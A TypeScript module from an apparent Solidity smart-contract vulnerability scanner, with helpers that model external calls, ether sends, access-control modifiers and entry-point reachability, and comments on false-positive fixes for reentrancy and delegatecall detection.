import type { AstNode, Finding, Severity } from "./types.ts";
import type { ContractModel, FnModel, ModModel, SourceModel, StateVar } from "./model.ts";
import { classifyFunction, isExplicitGuardModifierName } from "./reachability.ts";
import type { GateKind } from "./reachability.ts";
import { familyForDetector } from "./detector-registry.ts";
import {
  DELEGATECALL_FIXED_TARGET_NOTE,
  DELEGATECALL_INITIALIZER_ENTRY_NOTE,
  INITIALIZER_GATE_NOTE_UNCONFIRMED,
  unverifiedModifierNote,
  withAccessControlCap,
  withGateCap,
} from "./severity-calibration.ts";

type ExtKind =
  | "call"
  | "delegatecall"
  | "staticcall"
  | "callcode"
  | "send"
  | "transfer"
  | "erc20"
  | "member"
  | "selfdestruct";

type ExtCall = {
  kind: ExtKind;
  line: number;
  checked: boolean;
  sendsValue: boolean;
  target: string;
  targetIsParam: boolean;
  targetIsConst: boolean;
  argCount: number;
  raw: string;
  /** ERC-20 recipient (transfer/safeTransfer arg 0, transferFrom arg 1) — Fix 25. */
  recipient?: string;
  /** True when the call is the contract's own/inherited transfer/transferFrom — Fix 16. */
  ownToken?: boolean;
  /** Ether-send amount text (transfer/send arg 0, call{value:} arg) — Fix 17. */
  amount?: string;
  /** True for the synthetic call standing in for an internal callee's
   * external effects — it has no statement-level recipient/amount, so
   * it is excluded from sendDetails (Fix 17). */
  synthetic?: boolean;
  /** Fix 38: the literal `gas:` cap on this call, when the source
   * states one as a number literal. A value-bearing reentrant callback
   * needs 9000 gas (the value-transfer surcharge) + 700 (the CALL)
   * before any callee code runs, so a cap at or below 10_000 cannot
   * carry a value-moving reentry — the stipend lesson, generalized.
   * Non-literal caps earn no credit (fail closed: unknown). */
  gasCap?: number | null;
  /** Fix 38: the call's base is a state variable or const/immutable of
   * this contract that the flagged function never assigns — the call
   * hands control to a FIXED stored contract (a router, a token), so
   * the payee's code never runs inside this call and the target is not
   * caller-chosen. */
  targetIsFixedContract?: boolean;
};

type Flow = {
  seen: ExtCall | null;
  sawWrite: boolean;
  sawCall: boolean;
  callThenWrite: boolean;
  writeThenCall: boolean;
  /** True when the walker saw a genuine ether send: transfer/send (1-arg),
   * or call{value}. Token transfer(to, x) / super.transfer / SafeMath do
   * NOT set this — the old fn.source regex matched all three. */
  sawEtherSend: boolean;
  /** State vars written before the first external call (checks-effects order). */
  preCallWrites: Set<string>;
  /** State vars written after the first external call (the stale-read surface). */
  postCallWrites: Set<string>;
  /** Base expressions of genuine ether sends (recipients), for the
   * caller-control check in unprotected-ether. */
  sendTargets: string[];
  /** True while every genuine ether send so far is a refund: to
   * msg.sender, of an amount derived from this call's msg.value
   * (payable(msg.sender).transfer(msg.value - fee)). A refund cannot
   * drain anything — the caller only ever gets their own deposit back —
   * so it is not an open drain. Starts true (vacuous); any send whose
   * target is not msg.sender or whose amount is not msg.value-derived
   * flips it false. A refund staged through a local variable
   * (uint256 r = msg.value - fee; msg.sender.transfer(r)) is NOT
   * recognized: fail closed, the finding still fires. */
  allSendsAreRefunds: boolean;
  /** First write line per state var (Fix 12: the window close). */
  writeLines: Map<string, number>;
  /** Read lines per state var (Fix 12: demonstrated stale-read path).
   * Recorded for bare Identifier nodes that reach noteExpr — LHS
   * writes never reach noteExpr (they go to noteWrite), so a read
   * here is a genuine read, not a write. */
  readLines: Map<string, number[]>;
  /** Internal (bare-identifier) calls with their lines (Fix 12). */
  calleeCalls: { name: string; line: number }[];
  /** Genuine ether sends with their amounts (Fix 17). */
  sendDetails: { target: string; amount: string }[];
};

const ASSIGN = new Set(["=", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "<<=", ">>="]);
const LOW_LEVEL = new Set(["call", "delegatecall", "staticcall", "callcode", "send", "transfer"]);
// Fix 27: receiver-hook carriers. These functions invoke an attacker
// callback on the recipient by design (ERC721/1155 receiver hooks), so
// a call to one genuinely opens a reentrancy window even when the
// callee is inherited (not in byName) or profile() does not mark it
// external (profile() only counts LOW_LEVEL calls).
const HOOK_CARRIERS = new Set([
  "_safeMint", "_safeTransfer",
  "safeTransferFrom", "safeBatchTransferFrom",
  "_checkOnERC721Received", "_checkOnERC1155Received",
]);
/**
 * Pure-arithmetic library methods (SafeMath). `balances[x].sub(wad)` is
 * arithmetic on a value, not a call to another contract — it must never
 * count as an external call, or every SafeMath transfer looks like
 * call-then-write reentrancy.
 */
const SAFE_MATH = new Set(["add", "sub", "mul", "div", "mod"]);
const BUILTIN = new Set([
  "require", "assert", "revert", "keccak256", "sha256", "ripemd160", "ecrecover",
  "addmod", "mulmod", "gasleft", "blockhash", "encode", "encodePacked",
  "encodeWithSignature", "encodeWithSelector", "encodeCall", "concat", "push", "pop",
]);

/** Privileged state-variable names. Exported for initializer-gate.ts:
 *  its live-evidence rule asks whether an initializer writes one of
 *  these — the same family this module's detectors reason about. */
export const PRIVILEGED = /^(owner|admin|governor|implementation|pendingOwner|operator|oracle|beacon|logic|feeRecipient|treasury)$/;

/**
 * Cached `new RegExp`. The detector helpers build their patterns from contract
 * identifiers, so the same pattern was compiled again on every call — and the
 * analysis is the per-address bottleneck of a large run. Compiling each distinct
 * pattern once is a cheap, behaviour-preserving win.
 *
 * Global-flag regexes are stateful (`lastIndex`), so they are never shared: a
 * cached `/g` pattern reused by `matchAll`/`test` would resume mid-string. Those
 * are constructed fresh, exactly as before.
 */
const REGEX_CACHE = new Map<string, RegExp>();
function rx(pattern: string, flags = ""): RegExp {
  if (flags.includes("g")) return new RegExp(pattern, flags);
  const key = flags ? `${flags}:${pattern}` : pattern;
  let compiled = REGEX_CACHE.get(key);
  if (!compiled) {
    // Bound the cache; patterns vary with identifiers across a long run.
    if (REGEX_CACHE.size >= 5000) REGEX_CACHE.clear();
    compiled = new RegExp(pattern, flags);
    REGEX_CACHE.set(key, compiled);
  }
  return compiled;
}

function lineOf(node: AstNode | undefined, delta: number, fallback: number): number {
  const raw = node?.loc?.start.line ?? fallback + delta;
  return Math.max(1, raw - delta);
}

function sliceOf(source: string, node: AstNode | undefined): string {
  if (!node?.range) return "";
  // @solidity-parser/parser ranges are INCLUSIVE-end: [start, end] where end
  // is the index of the last character. slice() needs end + 1, or every
  // sliced string loses its final character ("owner" -> "owne").
  return source.slice(node.range[0], node.range[1] + 1).replace(/\s+/g, " ").trim();
}

function snippet(source: string, astLine: number, delta: number): string {
  const lines = source.split("\n");
  const start = Math.max(0, astLine - 5);
  const end = Math.min(lines.length, astLine + 4);
  return lines
    .slice(start, end)
    .map((text, i) => {
      const raw = start + i + 1;
      const mark = raw === astLine ? ">" : " ";
      return `${mark} ${String(Math.max(1, raw - delta)).padStart(4, " ")}  ${text}`;
    })
    .join("\n");
}

function rootIdent(node: AstNode | undefined): string | null {
  if (!node) return null;
  if (node.type === "Identifier" && typeof node.name === "string") return node.name;
  if (node.type === "IndexAccess") return rootIdent(node.base as AstNode);
  if (node.type === "MemberAccess") return rootIdent(node.expression as AstNode);
  if (node.type === "FunctionCall") return rootIdent(node.expression as AstNode);
  if (node.type === "TupleExpression") return null;
  return null;
}

function unwrapCallee(expr: AstNode): { member: string | null; base: AstNode | null; named?: AstNode } {
  if (expr.type === "NameValueExpression") {
    const inner = expr.expression as AstNode;
    const next = unwrapCallee(inner);
    return { ...next, named: (expr.arguments as AstNode) ?? next.named };
  }
  // Pre-0.5 call modifiers — `x.call.value(y)()`, `x.call.gas(g).value(y)()`.
  //
  // The parser renders `.value(y)` as a CALL on a member access named `value`,
  // so a pre-0.5 ether send arrives as FunctionCall(MemberAccess("value", …)).
  // Without this branch unwrapCallee reports member "value", which is not in
  // LOW_LEVEL: the call is classified as an ordinary member call and every
  // downstream rule that keys on kind "call" (reentrancy above all) never sees
  // it. That is the whole pre-0.5 syntax family, and it is why the reentrancy
  // detector scored 0.065 recall on the 2018 SmartBugs corpus — measured, not
  // guessed: `.call.value(x)()` produced no finding while `.call()` and
  // `.call{value: x}("")` both did.
  //
  // The modifier is a CHAIN STEP, not the callee: unwrap past it and rebuild
  // the `named` node the modern `.call{value: y}` form produces, so the
  // existing consumers (sendsValue, the send amount, the literal gas cap) work
  // unchanged instead of each needing its own pre-0.5 special case.
  if (expr.type === "FunctionCall") {
    const inner = unwrapCallee(expr.expression as AstNode);
    if (inner.member === "value" || inner.member === "gas") {
      const below = unwrapCallee((expr.expression as AstNode).expression as AstNode);
      const belowNamed = below.named as AstNode | undefined;
      const names = [
        inner.member,
        ...(((belowNamed?.names as string[] | undefined) ?? [])),
      ];
      const args = [
        ...(((expr.arguments as AstNode[] | undefined) ?? [])),
        ...(((belowNamed?.arguments as AstNode[] | undefined) ?? [])),
      ];
      return { member: below.member, base: below.base, named: { type: "FunctionCall", names, arguments: args } as unknown as AstNode };
    }
    // A call on a call result (x.f().g()): the callee is still the inner member.
    return inner;
  }
  if (expr.type === "MemberAccess") {
    return { member: String(expr.memberName ?? ""), base: expr.expression as AstNode };
  }
  if (expr.type === "Identifier") return { member: String(expr.name ?? ""), base: null };
  return { member: null, base: null };
}

function namedValue(named: AstNode | undefined, key: string): boolean {
  if (!named || !Array.isArray(named.names)) return false;
  return (named.names as string[]).includes(key);
}

/**
 * True when a modifier definition gates on the caller: its body compares
 * msg.sender / _msgSender against something, or requires on it. A modifier
 * that merely gates on state (onlyActive, onlyPaused) has no sender check
 * and is NOT access control. Returns null when the modifier is not defined
 * in this compilation (imported) — the caller falls back to the name list.
 */
/**
 * True when a value recipient / selfdestruct beneficiary is under the
 * caller's control: it is msg.sender, a function parameter, a complex
 * expression mentioning either, or a state variable this function writes
 * (so the caller can redirect it). A constant, a literal, or a state
 * variable this function does not write is FIXED — anyone can trigger the
 * send, but they cannot redirect the funds to themselves.
 */
// Fix 27/29 helper: resolve a member call's callee function via the
// base expression. The base may be a state variable (resolve via its
// declared type), a parameter (resolve via its declared type), or a
// contract type name (the type itself). Returns the callee function
// plus the contract it was found in, or undefined when unresolvable
// (plain address, msg/block/abi, unknown type).
function resolveCalleeFn(
  member: string,
  baseName: string | null,
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
): { fn: FnModel; contractName: string } | undefined {
  if (!member || !baseName) return undefined;
  let typeName: string | undefined;
  const sv = contract.stateVars.find((v) => v.name === baseName);
  if (sv) typeName = sv.typeName.replace(/\[\]$/, "");
  else {
    const p = fn.params.find((x) => x.name === baseName);
    if (p) typeName = p.typeName.replace(/\[\]$/, "");
    else if (model.contracts.some((c) => c.name === baseName)) typeName = baseName;
  }
  if (!typeName) return undefined;
  const target = model.contracts.find((c) => c.name === typeName);
  if (!target) return undefined;
  const calleeFn = target.functions.find((f) => f.name === member);
  if (!calleeFn) return undefined;
  return { fn: calleeFn, contractName: target.name };
}

// Paren-depth scan: given the index of an opening "(", return the
// index of the matching ")" (or -1 when unbalanced).
function parenClose(src: string, openIdx: number): number {
  let depth = 0;
  for (let i = openIdx; i < src.length; i++) {
    if (src[i] === "(") depth++;
    else if (src[i] === ")") {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

// Zero-guard check (shared by the zero-address finding and Fix 28):
// the source guards `param != 0` in a require, or rejects `param == 0`
// in an if.
function hasZeroGuardFor(src: string, param: string): boolean {
  const esc = param.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  return rx(`require\\s*\\(\\s*${esc}\\s*!=`).test(src) ||
    rx(`if\\s*\\(\\s*${esc}\\s*==\\s*(0\\b|address\\s*\\(\\s*0\\s*\\))`).test(src);
}

// Split a call argument list on top-level commas (respecting nested
// parens/brackets/braces), so positional args can be picked out.
function splitTopLevel(argsText: string): string[] {
  const out: string[] = [];
  let depth = 0;
  let cur = "";
  for (const ch of argsText) {
    if (ch === "(" || ch === "[" || ch === "{") depth++;
    else if (ch === ")" || ch === "]" || ch === "}") depth--;
    if (ch === "," && depth === 0) {
      out.push(cur);
      cur = "";
    } else cur += ch;
  }
  out.push(cur);
  return out;
}

// Fix 28: does an INTERNAL zero-address setter have a reachable
// caller that can pass zero without a gate? The setter's first
// address parameter is the value written (matches the addrWrite
// check in scanSimple); callers pass it positionally. A caller is
// gated when its own source guards its corresponding argument.
// A literal address(0) from a renounce-style caller ("renounce" in
// the name) is intentional, not a bug. A literal non-zero address
// or msg.sender can never be zero. Everything else (bare param with
// no guard, expression, storage read) can be zero — fail closed.
// No callers at all (dead code) counts as no ungated caller.
// Limitation: only function bodies are searched; a modifier calling
// the setter is not covered.
function internalZeroSetterHasUngatedCaller(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
): boolean {
  const paramIdx = fn.params.findIndex((p) => p.typeName === "address");
  if (paramIdx < 0) return true; // not a setter of this shape — fail closed
  const escName = fn.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const callRe = rx(`\\b${escName}\\s*\\(`, "g");
  for (const c of model.contracts) {
    for (const g of c.functions) {
      if (c.name === contract.name && g.name === fn.name) continue;
      for (const m of g.source.matchAll(callRe)) {
        const openIdx = m.index + m[0].length - 1; // the "("
        const closeIdx = parenClose(g.source, openIdx);
        if (closeIdx < 0) continue;
        const arg = (splitTopLevel(g.source.slice(openIdx + 1, closeIdx))[paramIdx] ?? "").trim();
        if (/^address\s*\(\s*0\s*\)$/.test(arg) || arg === "0") {
          if (/renounce/i.test(g.name)) continue; // intentional zeroing
          return true;
        }
        if (/^0x[0-9a-fA-F]{40}$/.test(arg)) continue; // literal non-zero
        if (/^(msg\.sender|_msgSender\(\s*\))$/.test(arg)) continue; // never zero
        const callerParam = g.params.find((p) => p.name === arg);
        if (callerParam && hasZeroGuardFor(g.source, arg)) continue; // gated
        return true; // bare ungated param, expression, or storage read
      }
    }
  }
  return false;
}

function isCallerControlled(expr: string, fn: FnModel, contract: ContractModel): boolean {
  const text = expr.trim();
  if (!text) return true; // unknown -> conservative
  if (/^0x[0-9a-fA-F]+$/.test(text)) return false; // address literal
  // Fix 13: address(this) / payable(address(this)) is the contract's own
  // address, not a caller-chosen beneficiary. Burn's constructor
  // selfdestruct(payable(address(this))) is a self-burn, not a theft.
  // Whitespace and the payable cast are normalized away; anything
  // larger (address(this).balance, a function of the address) falls
  // through to the conservative rules below.
  const squashed = text.replace(/\s+/g, "");
  if (squashed === "address(this)" || squashed === "payable(address(this))") return false;
  if (/\bmsg\.sender\b/.test(text)) return true;
  for (const p of fn.params) {
    if (p.name && rx(`\\b${p.name}\\b`).test(text)) return true;
  }
  const root = text.replace(/\[.*\]$/, "").trim();
  if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(root)) {
    const v = contract.stateVars.find((s) => s.name === root);
    if (v) {
      // Fixed unless this function writes it (caller can redirect it).
      return !v.constOrImmutable && rx(`\\b${root}\\s*[-+*/%]?=`).test(fn.source);
    }
  }
  return true; // complex expression -> conservative
}

function modifierGuardsSender(name: string, contract: ContractModel, model?: SourceModel): boolean | null {
  const defs = [contract, ...(model?.contracts.filter((c) => contract.bases.includes(c.name)) ?? [])];
  let found = false;
  for (const c of defs) {
    const def = c.modifiers.find((d) => d.name === name);
    if (!def) continue;
    found = true;
    // Strip index expressions first: `tokenBalance[msg.sender] == 0` is a check
    // on the CALLER'S OWN balance (a precondition — D1's "token-holding" class),
    // not a comparison of the caller against a privileged party. Counting it as
    // a guard marked the modifier_reentrancy airDrop as access-controlled and
    // hid the reentrancy entirely.
    const withoutIndexes = def.source.replace(/\[[^\]]*\]/g, "[]");
    if (
      /(msg\.sender|_msgSender\s*\(\s*\))/.test(withoutIndexes) &&
      /(==|!=|require\s*\()/.test(withoutIndexes)
    ) {
      return true;
    }
  }
  return found ? false : null;
}

function isAuthed(fn: FnModel, contract?: ContractModel, model?: SourceModel, skipPerItem = false): boolean {
  // In-file modifier bodies beat names: onlyRegistrar (if (msg.sender !=
  // registrar) throw) IS access control; onlyActive (if (!active) throw)
  // is a state gate and is NOT. Only when the modifier is imported and
  // its body is invisible do we fall back to the name list.
  if (contract) {
    for (const m of fn.modifiers) {
      const guarded = modifierGuardsSender(m, contract, model);
      if (guarded === true) return true;
      if (guarded === false) continue;
      // null (imported) -> fall through to the name list below.
    }
  }
  if (fn.modifiers.some((m) => /onlyowner|onlyadmin|onlyrole|onlygovernor|onlygovernance|onlyauth|requiresauth|authorized|onlyminter|onlyoperator|onlyguardian/i.test(m))) {
    return true;
  }
  // P7 (2026-10-27 detection upgrade): the guard names the list above
  // misses. The engagement's own false positives carried guards called
  // ownerOnly (Bancor), hasMintPermission, oraclizeAction, isPlayer and
  // treasuryOnly — none matched the legacy regex, so every one of them
  // was reported as unauthenticated. Only the LEARNED list is credited
  // as proven here: a bare `onlyXxx` convention (onlyBeacon) stays a
  // POSSIBLE guard, so it caps at high with a note instead of clearing
  // the finding — the Fix 38 discipline. The vocabulary lives in
  // reachability.ts so the detector and the Phase 4 adjudicator cannot
  // drift apart.
  if (fn.modifiers.some((m) => isExplicitGuardModifierName(m))) {
    return true;
  }
  const src = fn.source;
  if (/_checkOwner\s*\(|_requireOwner\s*\(|onlyOwner\s*\(/.test(src)) return true;
  if (/msg\.sender\s*==\s*[A-Za-z_]/.test(src) && !/tx\.origin/.test(src)) return true;
  if (/require\s*\(\s*msg\.sender\s*==/.test(src)) return true;
  // Fixed-caller gate written as an early abort rather than an equality check:
  //   if (msg.sender != GATEWAY) { revert Unauthorized(); }
  // This is the Snowbridge Agent's only guard (0xd803472c…46a8, 1,068 ETH), and the
  // doctrine above already credits "fixed-caller gates" — but only the `==` order was
  // matched, so `authed` was false and arbitrary-dispatch-call reported it critical on
  // a function an external attacker cannot call. Either operand order, and the abort
  // must actually abort (revert / throw / a braced block that reverts).
  if (
    !/tx\.origin/.test(src) &&
    (/if\s*\(\s*msg\.sender\s*!=\s*[A-Za-z_][\w.]*\s*\)\s*(?:\{|revert|throw)/.test(src) ||
      /if\s*\(\s*[A-Za-z_][\w.]*\s*!=\s*msg\.sender\s*\)\s*(?:\{|revert|throw)/.test(src))
  ) {
    return true;
  }
  // Per-asset ownership: items[_itemId].owner == msg.sender or
  // ownerOf(_itemId) == msg.sender. The asset's owner is the only party
  // who may act on that asset — ERC-721 approve and marketplace
  // buyback are gated exactly this way (ItemSelling's approve and
  // buyback were flagged as unauthenticated because the existing
  // msg.sender == X line only covers the msg.sender-first order). The
  // dotted form keeps bare `owner == msg.sender` (a param named owner
  // would make the check vacuous) out. skipPerItem lets the ether
  // check keep flagging a per-item-gated FULL-balance send.
  if (!skipPerItem && isPerItemAuthed(src)) return true;
  return false;
}

// True when src gates on per-asset ownership: X.owner == msg.sender
// (any dotted owner — item.owner, items[id].owner) or
// ownerOf(...) == msg.sender. `!=` never matches: the check must be
// an equality grant, not an exclusion.
//
// Fix 26: the helper-call form also counts — a require (or if) whose
// condition calls a helper whose name signals an ownership/approval
// check with msg.sender (or _msgSender()) and a token/id argument:
// require(_isApprovedOrOwner(_msgSender(), tokenId), "...") or
// require(_isApprovedOrOwner(msg.sender, tokenId), "...") — the
// ERC721Burnable.burn shape. The pushed Fix 10 only matched direct
// ownerOf/owner comparisons, so both burn forms still flagged. The
// helper must be called inside a require/if guard (not merely
// mentioned), and it must take a second argument (the token/id) after
// the sender argument, so a bare _isApprovedOrOwner(msg.sender) call
// with no asset does not count as per-item auth.
function isPerItemAuthed(src: string): boolean {
  if (/[A-Za-z_][\w.[\]]*\.owner\s*==\s*msg\.sender/.test(src) || /\bownerOf\s*\([^)]*\)\s*==\s*msg\.sender/.test(src)) return true;
  // Guard spans: the condition text of every require(...) / if(...)
  // in the source, found by paren-depth scan so nested calls (e.g.
  // _msgSender() inside the helper's own argument list) do not cut
  // the span short.
  const spans: string[] = [];
  for (const m of src.matchAll(/\b(?:require|if)\s*\(/g)) {
    let depth = 1;
    let i = m.index! + m[0].length;
    while (i < src.length && depth > 0) {
      if (src[i] === "(") depth += 1;
      else if (src[i] === ")") depth -= 1;
      i += 1;
    }
    spans.push(src.slice(m.index! + m[0].length, i - 1));
  }
  for (const span of spans) {
    const nameRe = /\b\w*(ApprovedOrOwner|isOwner|isApproved)\w*\s*\(/gi;
    let nm: RegExpExecArray | null;
    while ((nm = nameRe.exec(span)) !== null) {
      const rest = span.slice(nm.index + nm[0].length - 1);
      const sender = rest.search(/msg\.sender|_msgSender\s*\(/);
      if (sender < 0) continue;
      // A comma AFTER the sender argument means a second (token/id)
      // argument follows — this is a per-item check, not a global one.
      if (rest.indexOf(",", sender) >= 0) return true;
    }
  }
  return false;
}

function hasGuard(fn: FnModel): boolean {
  return fn.modifiers.some((m) => /nonreentrant|noreentrant|reentrancyguard/i.test(m));
}

// ---------------------------------------------------------------------------
// Fix 38 — the gate, generalized to delegatecall / reentrancy /
// selfdestruct. Fork-proof sweep #2 (2026-10-25,
// critical-sweep/RESULTS.md) executed every stored critical in those
// three classes against a mainnet fork: 37/37 were false positives.
// The classes of error were structural, and they are the same ones
// Fix 37 fixed for initializers:
//
//  PROVENANCE — internal helpers and library functions were flagged
//  as if they were entry points (OZ Address.functionDelegateCall
//  internals, EIP-173's internal _setImplementation, dividend
//  trackers' _withdrawDividendOfUser). A flag must be reachable
//  through a PUBLIC entry, and the claim it makes ("caller-supplied
//  target", "anyone can reenter") must be TRUE of that chain: the
//  delegatecall target is traced through the entry's call sites —
//  caller-fed, or fixed/stored state? A helper with no public path
//  at all produces no finding.
//
//  GUARD CREDIT — guards the detector could not see were treated as
//  absent: custom modifiers (onlymanyowners IS Wallet.sol's access
//  check; onlyBeacon gates the Cub fix appliers), fixed-caller gates
//  (`if (msg.sender != GATEWAY) revert`), AccessControl/governor
//  checks, and a hand-rolled mutex (KatWalkerz' `withdrawing` flag
//  neutralizes a real CEI violation). Proven guards cap per the
//  standing rules; a modifier that cannot be resolved or proven is
//  POSSIBLE evidence — the finding caps at high with a note naming
//  it, never silently dropped, never credited as proven.
//
//  WRITE ORDER, READ PROPERLY — the dividend family's flagged
//  "post-call write" is a FAILURE-ROLLBACK decrement inside
//  if(!success): the credit is written BEFORE the call and restored
//  only when the payment fails. CEI holds. The reentrancy ladder
//  below reads the branch structure instead of pattern-matching
//  "write after call". Payout mechanics that cannot carry a reentry
//  (stipends, explicit low gas caps, a fixed-router swap leg where
//  the payee's code never runs) are named rungs, not criticals.
//
// Everything uncertain fails CLOSED toward capped+noted — the same
// discipline as the initializer gate — and this batch is source-only:
// no live probe, so no finding here is ever marked corroborated by
// Fix 38. (A live leg does not compose the way the initializer probe
// does: reentrancy verdicts need funded positions a bare eth_call
// cannot hold, and a probe revert would mean "no position", not
// "guarded" — misleading evidence, worse than none.)
// ---------------------------------------------------------------------------

/** Externally callable = an attacker can invoke it directly. Default
 * visibility (pre-0.5, or the model's "default") is public in effect. */
function isExternallyCallable(fn: FnModel): boolean {
  return !fn.isConstructor && fn.visibility !== "internal" && fn.visibility !== "private";
}

/** A contract with derived contracts in this compilation may be
 * reachable through entries the detector cannot see — provenance
 * verdicts for its functions are then uncertain and must fail closed. */
function contractHasDerived(contract: ContractModel, model: SourceModel): boolean {
  return model.contracts.some((c) => c !== contract && c.bases.includes(contract.name));
}

type CalleeInfo = { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> };

/** Public entry points reaching each function of a contract, by
 * inverting the direct-callee map. A function is its own entry when
 * externally callable; fallback/receive count as entries of
 * themselves only (nothing calls them internally). */
function computeEntries(contract: ContractModel, direct: Map<string, CalleeInfo>): Map<string, FnModel[]> {
  const byNameLocal = new Map(contract.functions.map((f) => [f.name, f]));
  const callers = new Map<string, string[]>();
  for (const [name, info] of direct) {
    for (const callee of info.callees) {
      const list = callers.get(callee) ?? [];
      list.push(name);
      callers.set(callee, list);
    }
  }
  const entries = new Map<string, FnModel[]>();
  for (const f of contract.functions) {
    const found = new Map<string, FnModel>();
    if (isExternallyCallable(f)) found.set(f.name, f);
    const queue = [f.name];
    const visited = new Set<string>([f.name]);
    while (queue.length) {
      const cur = queue.shift() as string;
      for (const caller of callers.get(cur) ?? []) {
        if (visited.has(caller)) continue;
        visited.add(caller);
        const callerFn = byNameLocal.get(caller);
        if (!callerFn) continue;
        if (isExternallyCallable(callerFn)) found.set(caller, callerFn);
        queue.push(caller);
      }
    }
    entries.set(f.name, [...found.values()]);
  }
  return entries;
}

/** Entries for a function of a LIBRARY contract: the public entries of
 * the non-library contracts whose functions call it — Fix 24's
 * textual call-site scan, returning the callers' own entry sets. */
function librarySiteEntries(
  libContract: ContractModel,
  fn: FnModel,
  model: SourceModel,
): { entries: { fn: FnModel; contract: ContractModel }[]; anyCallSite: boolean } {
  const out: { fn: FnModel; contract: ContractModel }[] = [];
  const seenKeys = new Set<string>();
  let anyCallSite = false;
  const qualified = new RegExp(`\\b${libContract.name}\\s*\\.\\s*${fn.name}\\s*\\(`);
  const memberForm = new RegExp(`\\.\\s*${fn.name}\\s*\\(`);
  for (const c of model.contracts) {
    if (c === libContract || c.kind === "library") continue;
    const stateNamesC = new Set(c.stateVars.map((v) => v.name));
    const byNameC = new Map(c.functions.map((f) => [f.name, f]));
    const directC = new Map<string, CalleeInfo>();
    for (const f of c.functions) directC.set(f.name, profile(f, stateNamesC, byNameC));
    const entriesC = computeEntries(c, directC);
    for (const callerFn of c.functions) {
      if (!qualified.test(callerFn.source) && !memberForm.test(callerFn.source)) continue;
      anyCallSite = true;
      const es = entriesC.get(callerFn.name) ?? [];
      for (const e of es) {
        const key = `${c.name}.${e.name}`;
        if (seenKeys.has(key)) continue;
        seenKeys.add(key);
        out.push({ fn: e, contract: c });
      }
    }
  }
  return { entries: out, anyCallSite };
}

function findFnInCompilation(name: string, contract: ContractModel, model: SourceModel): FnModel | undefined {
  const scopes = [contract, ...model.contracts.filter((o) => contract.bases.includes(o.name))];
  for (const c of scopes) {
    const f = c.functions.find((x) => x.name === name);
    if (f) return f;
  }
  return undefined;
}

type ModifierEvidence = "auth" | "possible" | "none";

/** What a modifier proves about caller gating:
 *  - "auth": its body (or a helper it delegates to, one level deep)
 *    checks msg.sender in a comparison / require / owner-or-role call.
 *    Wallet.sol's onlymanyowners → confirmAndCheck is the canonical
 *    shape: the check is real, it just lives one call away.
 *  - "possible": the modifier is not defined in this compilation
 *    (imported — it may gate the caller and cannot be cleared), or it
 *    touches msg.sender / calls an unresolvable helper without a
 *    provable check. Possible evidence caps; it never clears.
 *  - "none": defined, and provably free of any caller logic (a pure
 *    state/timing gate like whenNotPaused). Earns no credit and
 *    blocks none either. */
function modifierSenderEvidence(modName: string, contract: ContractModel, model: SourceModel): ModifierEvidence {
  if (modifierGuardsSender(modName, contract, model)) return "auth";
  const name = modName.toLowerCase();
  const defs: { source: string }[] = [];
  for (const c of [contract, ...model.contracts.filter((o) => contract.bases.includes(o.name))]) {
    for (const m of c.modifiers) if (m.name.toLowerCase() === name) defs.push(m);
  }
  if (defs.length === 0) return "possible";
  let possible = false;
  const SENDER_CHECK =
    /msg\.sender\s*(?:==|!=)|(?:==|!=)\s*msg\.sender|\[\s*(?:uint|int|address)\s*\(\s*msg\.sender|(?:isOwner|isAdmin|isOperator|hasRole|canCall|_checkOwner|_requireOwner)\s*\([^)]*msg\.sender|require\s*\([^)]*msg\.sender|_msgSender\s*\(\s*\)\s*(?:==|!=)/;
  for (const def of defs) {
    const body = def.source;
    if (/(msg\.sender|_msgSender\s*\()/.test(body)) possible = true;
    for (const callMatch of body.matchAll(/\b([A-Za-z_]\w*)\s*\(/g)) {
      const helperName = callMatch[1] as string;
      if (helperName.toLowerCase() === name) continue;
      if (/^(require|if|for|while|return|assert|revert|emit)$/.test(helperName)) continue;
      const helper = findFnInCompilation(helperName, contract, model);
      if (!helper) {
        // The modifier delegates to something invisible (an imported
        // base's internal check, e.g. _checkRole): possible guard.
        possible = true;
        continue;
      }
      if (SENDER_CHECK.test(helper.source)) return "auth";
      if (/(msg\.sender|_msgSender\s*\()/.test(helper.source)) possible = true;
    }
  }
  return possible ? "possible" : "none";
}

/** A fixed-caller gate written as an early revert:
 * `if (msg.sender != GATEWAY) revert …` where the compared value is a
 * single stored identity (identifier or member access — never a
 * mapping lookup, which would be a per-user check of a different
 * kind). isAuthed's require-based patterns miss this form; the
 * sweep's gateway `invoke` is exactly this shape. */
function hasFixedCallerGate(fn: FnModel): boolean {
  return /if\s*\(\s*msg\.sender\s*!=\s*[A-Za-z_][\w.]*\s*\)\s*\{?\s*(revert|throw|return)\b/.test(fn.source);
}

type AuthEvidence = { authed: boolean; possibleMods: string[] };

/** Caller-gate evidence for one function: proven auth (isAuthed, a
 * fixed-caller gate, or a modifier with proven sender checks), plus
 * the names of any modifiers that are only POSSIBLE guards. */
function authEvidenceOf(fn: FnModel, contract: ContractModel, model: SourceModel): AuthEvidence {
  if (isAuthed(fn, contract, model) || hasFixedCallerGate(fn)) return { authed: true, possibleMods: [] };
  const possibleMods: string[] = [];
  for (const m of fn.modifiers) {
    const ev = modifierSenderEvidence(m, contract, model);
    if (ev === "auth") return { authed: true, possibleMods: [] };
    if (ev === "possible") possibleMods.push(m);
  }
  return { authed: false, possibleMods };
}

function isInitializerEntry(fn: FnModel): boolean {
  return (
    /^(initialize|initialise|init)$/i.test(fn.name) ||
    fn.modifiers.some((m) => /initiali[sz]er|reinitiali[sz]er/i.test(m))
  );
}

/** Argument lists of every textual call site of `calleeName` inside
 * a function's source (the Fix 28 pattern). The callee's own
 * declaration inside its own source is skipped. */
function callSiteArgs(fn: FnModel, calleeName: string): string[][] {
  const out: string[][] = [];
  const src = fn.source;
  const rx = new RegExp(`\\b${calleeName}\\s*\\(`, "g");
  let m: RegExpExecArray | null;
  while ((m = rx.exec(src))) {
    if (/(^|\s)function\s+$/.test(src.slice(Math.max(0, m.index - 16), m.index))) continue;
    const open = src.indexOf("(", m.index);
    const close = parenClose(src, open);
    if (close < 0) continue;
    out.push(splitTopLevel(src.slice(open + 1, close)).map((s) => s.trim()));
  }
  return out;
}

